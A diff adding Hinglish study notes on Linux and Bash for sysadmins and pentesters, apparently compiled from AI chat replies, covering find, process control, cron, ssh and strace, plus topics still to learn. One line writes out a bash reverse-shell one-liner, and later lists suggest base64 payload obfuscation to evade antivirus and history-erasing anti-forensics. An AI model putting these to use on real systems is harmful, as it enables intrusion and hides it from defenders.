+        * Column 2: Sirf file2 mein unique lines.
+        * Column 3: Dono files mein common lines.
+    * `Eg: comm -12 file1.txt file2.txt` -> Sirf common lines dikhana (Column 1 aur 2 ko suppress/chhipa do).
+
+---
+
+Yeh pehla batch tha! Inhe pehle digest kar lijiye.
+
+Iske baad hum agle topics (jaise `find`, `ssh`, `netcat`, `cron`, `lsof`, `strace` aur file/process management) ke notes bana sakte hain. Batana jab aap ready hon!
+
+
+=============================================================
+
+
+
+Bahut badiya\! Yeh raha agla batch, jismein hum File/Process Management, Automation aur System Monitoring par focus karenge.
+
+-----
+
+### **Lesson 4: Advanced File & Process Management**
+
+  * **`find` Command (Advanced Use)**
+
+      * **Matlab:** Sirf naam se nahi, balki type, size, time, aur permissions ke aadhaar par files ko dhoondhna.
+      * **`find . -type f`**
+          * **Matlab:** Sirf files (`f`) ko dhoondho. (`-type d` -\> sirf directories/folders ko dhoondhega).
+      * **`find . -size +20M`**
+          * **Matlab:** 20MB se badi files ko dhoondho. (`-10k` -\> 10KB se choti files).
+      * **`find . -mtime -5`**
+          * **Matlab:** Woh files jo pichle 5 dino ke andar modify (`mtime`) hui hain. (`+5` -\> 5 din se *purani* files).
+      * **`find . -perm /4000`**
+          * **Matlab:** SUID files ko dhoondhna. (Pentester ke liye bahut zaroori, privilege escalation ke liye check karte hain).
+      * **`find . -name "*.log" -exec rm {} \;`**
+          * **Matlab:** `-exec` ka matlab hai, "jo bhi file mile, uspar yeh command chalao".
+          * `{}` -\> Iska matlab hai "mili hui file ka naam".
+          * `\;` -\> Command ko khatam karne ke liye.
+          * **Poora Matlab:** ".log" par khatam hone wali saari files ko dhoondho aur unhe `rm` (delete) kar do.
+
+  * **Process Management (`ps`, `pgrep`, `kill`)**
+
+      * **`ps aux` ya `ps -ef`**
+          * **Matlab:** System par chal rahe *saare* processes ko poori detail mein dikhana.
+      * **`pgrep nginx`**
+          * **Matlab:** "nginx" naam ke process ki PID (Process ID) dhoondhne ka aasan tareeka.
+      * **`kill <PID>`**
+          * **Matlab:** Process ko gracefully (narmi se) band karne ka signal bhejna (Yeh default mein Signal 15 - SIGTERM bhejta hai).
+      * **`kill -9 <PID>`**
+          * **Matlab:** Process ko zabardasti (forcefully) band karna (Signal 9 - SIGKILL).
+          * **Note:** Yeh last option hai, jab process fans (hang) jaaye.
+      * **`pkill nginx`**
+          * **Matlab:** Bina PID dhoondhe, "nginx" naam ke saare process ko seedha band kar dena.
+
+  * **Background Jobs**
+
+      * **`./my_script.sh &`**
+          * **Matlab:** `&` lagane se command/script background mein chala jaata hai aur aapka terminal turant free ho jaata hai.
+      * **`Ctrl + Z`**
+          * **Matlab:** Terminal par chal rahe command ko turant pause (rok) karke background mein daalna. (Job "Stopped" state mein chala jaata hai).
+      * **`jobs`**
+          * **Matlab:** Background mein chal rahe (ya ruke hue) saare jobs ki list dikhata hai.
+      * **`fg %1`**
+          * **Matlab:** Job number 1 ko wapas foreground (saamne) le aana.
+      * **`bg %1`**
+          * **Matlab:** Ruke hue job number 1 ko background mein wapas chalu (resume) karna.
+
+-----
+
+### **Lesson 5: System Administration & Automation**
+
+  * **Task Scheduling (`cron` aur `crontab`)**
+
+      * **Matlab:** Scripts ko automatically ek set time ya interval par chalane ke liye.
+
+      * **`crontab -e`** -\> Cron jobs ko edit (add/change) karne ke liye.
+
+      * **`crontab -l`** -\> Abhi schedule kiye gaye saare jobs ko list karne ke liye.
+
+      * **Syntax:**
+
+        ```
+        (Minute) (Hour) (Day of Month) (Month) (Day of Week) /path/to/command
+        * * * * *
+        ```
+
+      * **`Eg 1: 0 4 * * 1 /root/backup.sh`**
+
+          * **Matlab:** Har Monday (`1`) ko subah 4:00 baje (`0 4`) `/root/backup.sh` script chalana.
+
+      * **`Eg 2: */10 * * * * /root/check_health.sh`**
+
+          * **Matlab:** Har 10 minute (`*/10`) mein `/root/check_health.sh` script chalana.
+
+  * **One-Time Task (`at` command)**
+
+      * **Matlab:** `cron` hamesha chalta hai, `at` command se schedule kiya gaya kaam sirf ek baar chalta hai.
+      * `Eg: at now + 10 minutes`
+          * Iske baad aap command likhein (jaise `/root/reboot.sh`) aur `Ctrl+D` dabayein.
+          * **Matlab:** 10 minute baad woh command chal jaayega.
+      * `Eg: at 10:30 PM tomorrow`
+
+  * **Remote Automation (`ssh` & `scp`)**
+
+      * **`ssh user@server_ip`**
+          * **Matlab:** Doosre Linux server par securely login karna.
+      * **`ssh user@server_ip "ls -l /var/www"`**
+          * **Matlab:** Remote server par login kiye bina, `ls -l` command chalana aur uska output apne terminal par dekhna.
+      * **`scp file.txt user@server_ip:/home/user/`**
+          * **Matlab:** Apni local machine se `file.txt` ko remote server ke `/home/user/` folder mein copy (upload) karna.
+      * **`scp user@server_ip:/var/log/nginx.log .`**
+          * **Matlab:** Remote server se `nginx.log` ko apni local machine par (Dot `.` ka matlab hai 'current folder') copy (download) karna.
+
+  * **User Management Commands**
+
+      * **`useradd -m -s /bin/bash new_user`**
+          * **Matlab:** Naya user banana.
+          * `-m` -\> User ki home directory (`/home/new_user`) bhi banao.
+          * `-s` -\> User ka default shell `/bin/bash` set karo.
+      * **`usermod -aG sudo new_user`**
+          * **Matlab:** `new_user` ko `sudo` group mein add karna taaki woh `sudo` command chala sake.
+          * `-aG` -\> Append to Group (Group se nikale bina naye group mein add karna).
+      * **`userdel -r new_user`**
+          * **Matlab:** `new_user` ko uski home directory ke saath (`-r`) delete karna.
+
+-----
+
+### **Lesson 6: Advanced System Analysis (Troubleshooting)**
+
+  * **`lsof` (List Open Files)**
+
+      * **Matlab:** Yeh batata hai ki kaunsa process kaunsi file ya network connection use kar raha hai. (Linux mein sab kuch ek file hai).
+      * `Eg: lsof /var/log/auth.log`
+          * **Matlab:** Pata lagana ki `/var/log/auth.log` file ko kaunsa process abhi use kar raha hai.
+      * `Eg: lsof -i :80`
+          * **Matlab:** Port 80 ko kaunsa process (jaise Apache ya Nginx) sun (listen) raha hai.
+      * `Eg: lsof -p 1234`
+          * **Matlab:** PID 1234 wale process ne kaun-kaun si files khol rakhi hain.
+
+  * **`strace` (System Trace)**
+
+      * **Matlab:** Yeh parde ke peeche dekhta hai ki ek program chalte waqt kernel se kya-kya maang raha hai (System Calls).
+      * **Kyun Zaroori:** Jab koi program (jaise 'Apache') start nahi hota aur "File not found" jaisa ajeeb error deta hai, `strace` batata hai ki woh *asal mein kaunsi* file dhoondh raha tha (jo shayad galat path par ho).
+      * `Eg: strace ls /tmp`
+          * **Matlab:** `ls` command ko trace karna. Aapko `open`, `read`, `write` jaise calls dikhenge.
+      * `Eg: strace -p 1234`
+          * **Matlab:** Ek pehle se chal rahe process (PID 1234) ko trace karna.
+
+-----
+
+Yeh batch ho gaya\! Ab humara aakhri aur sabse important batch (Pentesters ke liye) bacha hai. Usmein hum `netcat`, `curl`, `wget`, Reverse Shells, aur `nmap` jaise tools ko scripts mein use karna cover karenge.
+
+Ready ho?
+
+
+
+=============================================================
+
+
+Bilkul! Aapke notes bahut zabardast hain aur foundation concepts ko bahut acchi tarah se cover karte hain. Lekin ek pro pentester ya admin banne ke liye, aap kuch aur powerful topics add kar sakte hain jo aapke kaam ko bahut aasan aur effective bana denge.
+
+Maine aapke saare notes ko review kiya hai, aur yeh rahe woh missing topics jo aapko zaroor cover karne chahiye:
+
+---
+
+### **1. Core Shell Scripting Concepts (Sabke liye Zaroori)**
+
+* **Debugging Scripts (`set` command):**
+    * Scripts mein galtiyan (bugs) dhoondhne ke liye.
+    * `set -x` (Har command run hone se pehle use print karta hai).
+    * `set -e` (Agar koi command fail ho jaye toh script ko turant rok deta hai).
+    * `set -u` (Agar koi undefined variable use ho toh error deta hai).
+
+* **Script Arguments ko Handle karna (`getopts`):**
+    * Professional scripts ki tarah options (jaise `-f <filename>` ya `-v`) add karne ke liye. Yeh `$1`, `$2` se zyada flexible hai.
+
+* **Process Management (Processes ko Control karna):**
+    * `ps`, `pgrep`, `pkill`, `kill`: Chal rahe programs (processes) ko dekhne, dhoondhne aur band karne ke liye.
+    * Background Jobs (`&`, `jobs`, `fg`, `bg`): Lambe tasks ko background mein chalane ke liye taaki aapka terminal free rahe.
+
+### **2. Powerful Text Processing (Text ko manipulate karne ke liye)**
+
+* **`sed` (Stream Editor):**
+    * Files mein text ko search and replace karne ke liye, bina file khole. Log files aur configuration files ko edit karne ke liye best hai.
+    
+
+* **`awk`:**
+    * Yeh `cut` se bahut zyada powerful hai. Column-based data (jaise CSV files, log files, ya command outputs) ko process karne, filter karne aur reports banane ke liye.
+    
+
+* **Regular Expressions (Regex) in Depth:**
+    * Aapne wildcards cover kiye hain, lekin `grep`, `sed`, aur `awk` ke saath advanced text patterns match karne ke liye Regex seekhna game-changer hai.
+
+### **3. System Administration & Automation**
+
+* **Task Scheduling (Kaam ko automate karna):**
+    * `cron` aur `crontab`: Scripts ko automatically, ek particular time ya interval par chalane ke liye (jaise har roz subah backup lena ya system health check karna).
+    
+
+* **User and Group Management Commands:**
+    * `useradd`, `usermod`, `userdel`, `groupadd`: Scripts ke zariye naye users banane ya unhe manage karne ke liye.
+
+* **Log File Analysis:**
+    * `tail -f`, `journalctl`: Real-time mein log files ko monitor karne ke liye. Saath mein `grep`, `awk`, `sort`, `uniq` ka istemaal karke logs mein se zaroori information nikalna.
+
+### **4. Networking aur Security (Pentesters ke liye bahut Zaroori)**
+
+* **`netcat` (`nc`):**
+    * Ise 'Swiss-army knife' kehte hain. Port scanning, banner grabbing, file transfer, aur reverse/bind shells banane ke liye essential hai. Iske bina pentesting adhoori hai.
+
+* **`curl` aur `wget`:**
+    * Command line se websites se data download karne, web pages ka source code dekhne, ya API requests bhejne ke liye. Reconnaissance (jaankari ikattha karna) ke liye bahut kaam aate hain.
+
+* **Reverse Shells using Bash:**
+    * Yeh concept bahut zaroori hai. Bash ka istemaal karke victim machine se apne machine par ek remote shell (connection) kaise banayein. Jaise: `bash -i >& /dev/tcp/IP/PORT 0>&1`.
+    
+
+* **Automating Reconnaissance Tasks:**
+    * `nmap` jaise tools ke output ko parse karna.
+    * Subdomain enumeration ke liye `subfinder` ya `amass` jaise tools ke output ko `grep`, `sort`, `uniq` ke saath process karna.
+
+* **Privilege Escalation Scripts:**
+    * Scripts likhna jo system mein aam galtiyan (misconfigurations) dhoondhein. Jaise:
+        * `find` command se SUID/SGID files dhoondhna.
+        * `cron` jobs check karna jo ajeeb permissions ke saath run ho rahi hain.
+        * World-writable files aur folders ko dhoondhna.
+
+Yeh topics aapke skills ko "basic user" se "professional pentester/admin" level par le jayenge. Inhe apne notes mein add karne se aapki knowledge complete ho jayegi. Good luck!
+
+Haan, bilkul! Pehle wali list foundational aur intermediate topics ke liye thi. Agar aap sach mein 'power user' ya 'expert' level par jaana chahte hain, toh kuch aur advanced aur specialized topics hain jo ek top-level Pentester aur Admin ke liye bahut zaroori hain.
+
+Yeh rahe woh next-level missing topics:
+
+---
+
+### **Category 1: Advanced Scripting aur Best Practices (Script ko Professional Banana)**
+
+1.  **`trap` Command (Cleanup on Exit):**
+    * **Kyun Zaroori Hai:** Aapki script temporary files banati hai. Agar script beech mein `Ctrl+C` se band ho jaaye ya koi error aa jaaye, toh woh temporary files delete nahi hongi. `trap` command yeh sunishchit karta hai ki script ke exit hone par (chahe kaise bhi ho), ek specific command (jaise cleanup function) zaroor chale.
+    
+
+2.  **Robust Error Handling & Logging:**
+    * **Kyun Zaroori Hai:** Sirf `set -e` kaafi nahi hai. Ek professional script mein proper error handling hoti hai.
+        * Har command ke baad uska **Exit Status (`$?`)** check karna.
+        * Error messages ko Standard Error (`stderr`) par bhejna, taaki normal output se alag dikhe. (Jaise: `echo "Error: File not found" >&2`)
+        * Script ke actions ko ek log file mein likhna taaki baad mein check kar sakein ki kab kya hua.
+
+3.  **`jq` - The JSON Processor:**
+    * **Kyun Zaroori Hai:** Aajkal saare APIs, cloud services aur modern tools `JSON` format mein output dete hain. Isse `grep` aur `awk` se parse karna bahut mushkil hai. `jq` command JSON data ko aasani se filter karne, data nikalne aur manipulate karne ke liye banaya gaya hai. Pentesters aur Admins ke liye yeh **must-have skill** hai.
+    
+
+4.  **Associative Arrays (Key-Value Pairs):**
+    * **Kyun Zaroori Hai:** Aapne normal arrays seekhe hain jo index `[0], [1]` par kaam karte hain. Associative arrays aapko custom keys (jaise text) use karne dete hain. Jaise: `user['name']="Satish"` aur `user['role']="Admin"`. Complex data ko manage karna isse bahut aasan ho jaata hai.
+
+### **Category 2: System Administration aur Remote Automation**
+
+5.  **`xargs` Command ka Advanced Use:**
+    * **Kyun Zaroori Hai:** Jab `find` command hazaaron files dhoondhta hai, toh un sabhi files par ek saath koi operation (jaise `rm` ya `chown`) karne ke liye `xargs` sabse efficient tareeka hai. Yeh performance ko behtar banata hai. `find ... | xargs ...` ek classic admin pattern hai.
+
+6.  **`ssh` & `scp` se Remote Automation:**
+    * **Kyun Zaroori Hai:** Asli kaam multiple servers par hota hai. Scripts likhna jo:
+        * Bina password daale (SSH keys ka use karke) remote servers par login karein.
+        * Ek saath 100 servers par koi command (jaise `uptime` ya `apt update`) chalayein.
+        * `scp` ka use karke servers ke beech files securely transfer karein.
+    
+
+7.  **System Health Monitoring Script Banana:**
+    * **Kyun Zaroori Hai:** Ek practical project jo aapko sab kuch ek saath use karna sikhayega. Ek aisi script banayein jo `df -h` (disk space), `free -m` (memory), `uptime` (load), `ss -tulpn` (open ports) jaise commands ka output lekar ek saaf-suthri report banaye aur aapko email kar de.
+
+### **Category 3: Advanced Security aur Pentesting Topics**
+
+8.  **Bash Obfuscation (Payload ko Chhipana):**
+    * **Kyun Zaroori Hai:** Pentesting mein, aapke payloads (jaise reverse shells) Antivirus ya Intrusion Detection Systems (IDS) se bachne chahiye. Apne bash script ko obfuscate karna (uska asli matlab chhipana) ek advanced technique hai. Iske liye `base64` encoding ya dusre creative methods ka use hota hai.
+
+9.  **Bash History & Anti-Forensics:**
+    * **Kyun Zaroori Hai:** Ek pentester ko apne nishaan mitana aana chahiye.
+        * `~/.bash_history` file kaise kaam karti hai?
+        * Commands ko history mein save hone se kaise rokein (`unset HISTFILE`, `set +o history`).
+        * History ko manipulate karna.
+
+10. **Secure Credential Handling in Scripts:**
+    * **Kyun Zaroori Hai:** Scripts mein kabhi bhi password plain text mein nahi likhna chahiye. Yeh sabse bada security risk hai. Iske liye sahi tareeke seekhna zaroori hai:
+        * `read -s` ka use karke user se password lena (taaki woh screen par na dikhe).
+        * Credentials ko Environment Variables mein store karna.
+        * `gpg` ka use karke sensitive information ko encrypt karna.
+
+Yeh topics aapko ek normal script writer se ek expert automator aur pentester banayenge. Inko master karne ke baad, aap Bash mein lagbhag kuch bhi kar sakte hain!
+
+
+Interacting with Kernel via /proc aur /sys Filesystems:
+
+Kyun Zaroori Hai: Linux mein, har cheez ek file hai. /proc aur /sys special directories hain jo aapko running system aur kernel ke baare mein real-time jaankari deti hain—bina kisi special command ke.
+
+Admins ke liye: Scripts likhna jo /proc/meminfo se memory usage, /proc/loadavg se system load, ya /proc/net/tcp se active network connections ko check karein.
+
+Pentesters ke liye: /proc/<PID>/cmdline se kisi process ke poore command ko dekhna ya /proc/<PID>/maps se uski memory layout ko samajhna.
+
+Real-time File System Monitoring (inotify tools):
+
+Kyun Zaroori Hai: Aap ek aisi script banana chahte hain jo jaise hi ek specific folder mein koi nayi file aaye, usse automatically process kar de. Ya, agar koi critical file (jaise /etc/passwd) modify ho, toh aapko turant alert mil jaaye. inotifywait command aapko yeh karne deta hai.
+
+Use Case: "Watchdog" scripts banana jo security events ya file uploads par react karein.
+
+Zaroor\! Aapne advanced topics ke baare mein poochha tha, lekin beginner se intermediate level par bhi kuch bahut important practical topics hain jo aksar log chhod dete hain. Yeh woh concepts hain jo aapke scripts ko "kaam chalau" se "bharosemand aur professional" banate hain.
+
+Aapke notes ko dekhte hue, yeh rahe kuch bahut zaroori beginner-to-intermediate topics jo aapko zaroor add karne chahiye:
+
+-----
+
+### **Category 1: Script ko Mazboot (Robust) Banana**
+
+1.  **Quoting ka Sahi Istemal (Single vs. Double Quotes):**
+
+      * **Kyun Zaroori Hai:** Yeh Bash scripting ka sabse common confusion point hai. Inke beech ka fark na jaanne se scripts mein ajeeb-o-gareeb bugs aate hain, khaaskar jab file names mein space ho.
+      * **Single Quotes (`' '`):** Iske andar sab kuch literal (jaisa hai waisa) maana jaata hai. Variables (`$VAR`) bhi expand nahi hote.
+      * **Double Quotes (`" "`):** Iske andar variables expand hote hain. Yeh file names aur user input ke liye sabse safe option hai.
+      * **Example:** `name="John Doe"`; `echo 'Hello $name'` -\> `Hello $name`; `echo "Hello $name"` -\> `Hello John Doe`
+
+2.  **Script se Exit karna (Exit Codes ka Sahi Use):**
+
+      * **Kyun Zaroori Hai:** Aapne `exit status ($?)` padha hai, lekin aapko apni script ke andar se bhi sahi exit status bhejna aana chahiye. Isse doosri scripts ya `cron` jobs ko pata chalta hai ki aapki script safal hui ya nahi.
+      * **`exit 0`**: Iska matlab hai "sab kuch theek tha, script safal hui."
+      * **`exit 1` (ya koi bhi non-zero number)**: Iska matlab hai "kuch gadbad hui, script fail ho gayi."
+      * **Example:**
+        ```bash
+        if ! [ -f "/path/to/important/file.txt" ]; then
+            echo "Error: Zaroori file nahi mili!" >&2
+            exit 1
+        fi
+        ```
+
+3.  **Arithmetic Operations (`((...))`):**
+
+      * **Kyun Zaroori Hai:** Numbers ke saath kaam karna bahut common hai. `let` purana tareeka hai. Modern Bash mein `((...))` ka use hota hai jo zyada aasan aur C-language jaisa hai.
+      * **Example:**
+        ```bash
+        count=5
+        ((count++))       # Increment
+        echo $count       # Output: 6
+
+        ((total = 5 * 4)) # Calculation
+        echo $total      # Output: 20
+        ```
+
+### **Category 2: Real-World Text aur File Handling**
+
+4.  **`find` Command ka Advanced Use:**
+
+      * **Kyun Zaroori Hai:** Sirf naam se file dhoondhna kaafi nahi hai. Ek admin ya pentester ko size, type, modification time, aur permissions ke आधार par files dhoondhni padti hain.
+      * **Important Options:**
+          * `-type f` (sirf files) / `-type d` (sirf directories)
+          * `-size +10M` (10 MB se badi files)
+          * `-mtime -7` (pichle 7 dino mein modify hui files)
+          * `-perm /4000` (SUID files dhoondhna - Pentesters ke liye goldmine\!)
+          * **`-exec`**: `find` se mili har file par koi command chalane ke liye. Jaise: `find . -type f -name "*.log" -exec rm {} \;`
+
+5.  **`sort`, `uniq`, aur `wc` ka Combination:**
+
+      * **Kyun Zaroori Hai:** Log files se useful information nikalne ke liye yeh trio sabse zaroori hai. Jaise, "kis IP address ne sabse zyada attack kiya?"
+      * **Classic Pattern:** `cat access.log | grep "login failed" | cut -d' ' -f8 | sort | uniq -c | sort -nr`
+          * Iska matlab hai: "Log file padho, 'login failed' wali lines nikalo, 8th column (IP address) kaato, unhe sort karo, har IP kitni baar aaya gino, aur phir count ke hisaab se descending order mein sort karo."
+
+6.  **`diff` Command (Files ko Compare karna):**
+
+      * **Kyun Zaroori Hai:** Do configuration files ke beech kya fark hai? Ya backup file aur current file mein kya badlaav hua hai? `diff` command aapko yeh batata hai. Admins ke liye troubleshooting mein bahut kaam aata hai.
+      * **Example:** `diff httpd.conf httpd.conf.backup`
+
+### **Category 3: Script ko Interactive aur Flexible Banana**
+
+7.  **Here Documents (`<<`):**
+
+      * **Kyun Zaroori Hai:** Jab aapko script ke andar hi multi-line text (jaise ek welcome message, SQL query, ya config block) likhna ho, toh Here Docs sabse saaf tareeka hai.
+      * **Example:**
+        ```bash
+        cat << EOF
+        Hello User,
+        Yeh script aapke system ki health check karegi.
+        - Disk Space
+        - Memory Usage
+        EOF
+        ```
+
+8.  **Help/Usage Function Banana:**
+
+      * **Kyun Zaroori Hai:** Har acchi script ko yeh batana chahiye ki use kaise istemaal karna hai. Ek `usage()` function banana ek best practice hai. Agar user galat argument de ya `-h` likhe, toh yeh function call hona chahiye.
+      * **Example:**
+        ```bash
+        usage() {
+            echo "Usage: $0 [-f filename] [-u username]"
+            exit 1
+        }
+
+        if [ "$1" == "-h" ]; then
+            usage
+        fi
+        ```
+
+Yeh topics aapke scripting ke foundation ko pathhar jaisa mazboot bana denge aur aapko intermediate level ki problems ko solve karne ke liye taiyaar karenge.
+
+
+Creating a Simple File Integrity Monitor (FIM):
+
+Kyun Zaroori Hai (Admin/Security): Yeh check karna ki aapki critical system files (jaise /etc/passwd, /etc/shadow, /bin/login) ko kisi ne badla toh nahi hai. Ek aisi script banayein jo pehli baar chalne par in sabhi files ka md5sum ya sha256sum (hash) nikal kar save kar le. Agli baar chalne par, woh naye hash ko purane hash se compare kare aur agar koi fark ho toh alert bhej de.
+
+
+Automating User Account Audits:
+
+Kyun Zaroori Hai (Admin): Ek aisi script likhna jo system ke saare users ko check kare. Jaise:
+
+Kaun se users hain jinka password nahi hai?
+
+Kaun se users hain jinhone 90 dino se password nahi badla hai?
+
+Kaun se users hain jinke paas root (UID 0) privileges hain?
+
+Yeh /etc/shadow aur /etc/passwd files ko parse karke kiya jaata hai.
+
+
+POSIX Compliance (Script ko Universal Banana):
+
+Kyun Zaroori Hai: Aapki script aapke system par chal rahi hai, par kya woh server par chalegi jahan bash nahi, balki sh ya dash hai (jo Debian/Ubuntu mein default hai)? POSIX ek standard hai jo yeh sunishchit karta hai ki aapki script har Unix-like system par chale. Iske liye [[ ... ]] ki jagah [ ... ] aur function keyword na use karne jaisi aadatein daalni padti hain.
+
+
+
+Hard Links vs Symbolic Links (Advanced):
+
+ln command for creating hard and soft links
+
+Understanding inode concepts
+
+Practical use cases and limitations of each
+
+
+comm Command:
+
+Comparing sorted files line-by-line
+
+Finding common lines, unique lines in File A, unique lines in File B
+
+Essential for file comparison tasks
+
+
+Advanced grep Patterns:
+
+-E (Extended regex) for complex patterns
+
+-r (Recursive) for searching through directories
+
+--include and --exclude for filtering file types
+
+-A (After context) and -B (Before context) for surrounding lines
+
+stat and File Timestamps:
+
+Access time (atime), modify time (mtime), change time (ctime)
+
+Using touch to modify timestamps
+
+Forensic implications of timestamp analysis
+
+
+Process Monitoring & Analysis:
+
+lsof (List Open Files) - seeing what files a process has open
+
+strace (System Trace) - monitoring system calls a process makes
+
+ltrace - tracking library calls
+
+Pentesting/debugging essential tools
+
+at Command (One-time Task Scheduling):
+
+Alternative to cron for single execution
+
+at 10:30 PM tomorrow < command.sh
+
+Useful for one-time backups or maintenance tasks
+
+anacron (Anacrontab):
+
+Cron alternative for systems that aren't always on
+
+Ensures jobs run even if system was off during scheduled time
+
+Laptop/mobile server environments
+
+
+Shell Startup Files (.bashrc, .bash_profile, .profile):
+
+Difference between login and non-login shells
+
+When each file is executed
+
+Order of execution and inheritance
+
+Security implications of modifying these files
+
+
+
+zip vs gzip vs bzip2 vs xz:
+
+Different compression algorithms and when to use each
+
+Creating encrypted archives
+
+Archiving large files incrementally
+
+
+=============================================================
+
+
+
+
+
+
+=============================================================
